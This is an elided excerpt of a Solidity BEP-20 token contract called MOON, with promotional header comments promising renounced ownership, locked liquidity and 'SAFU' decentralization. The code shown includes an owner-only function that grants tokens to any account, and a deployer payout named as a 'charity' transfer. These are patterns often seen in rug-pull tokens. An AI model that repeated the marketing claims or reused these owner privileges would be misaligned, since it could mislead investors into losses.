...
//   |_|  |_|\___/\___/|_||_|(_) 
//
//   Superburn. Reflections. No tax on buys. 100% Decentralized.
                            
// Moon.
// 10,000 tokens, burned each time someone sells.
// 0% tax on buys (applies buy pressure on the market) or wallet-to-wallet transfers, forever.
// For each sell order: 2% burn + 1% reflected to holders + 1% deployer fee = 4% tax.
// Contract ownership renounced (100% decentralization)
// Liquidity (LP) 100% lock for 7 years upon launch (No control on users funds)
// Fair launch (97% of the total supply is provided to Pancakeswap, 3% kept as developer shares).

// Built by the community, for the community.
// 100% decentralized: No owner and locked liquidity makes Moon SAFU forever.
// Create chatgroups, communities, websites and games around it. Build a trend!
// Let's spread the #MOON everywhere!
// How high can we go in 2023 and after?
...
contract MOON is Context, IERC20, Ownable {
    ...
    address payable public deployer = 0xCeDBd173CbbAFd9DA75c933144565a54112dcd50;
    ...
    function _grant(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: cannot grant rewards to the zero address");
    ...
    function grantInReward(address account, uint256 amount) public onlyOwner() {
    ...
    function _transfer(
        ...
        // If any account belongs to _isExcludedFromFee account, then the fee is removed
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        TransferCharityBNB(deployer, donationTransfer); 
    ...
    function swapTokensForBNB(uint256 tokenAmount) private {
        // Generates the pancakeswap pair path of token -> wBNB
    ...
    function TransferCharityBNB(address payable recipient, uint256 amount) private {
     ...
     // Contract ability to receive BNB
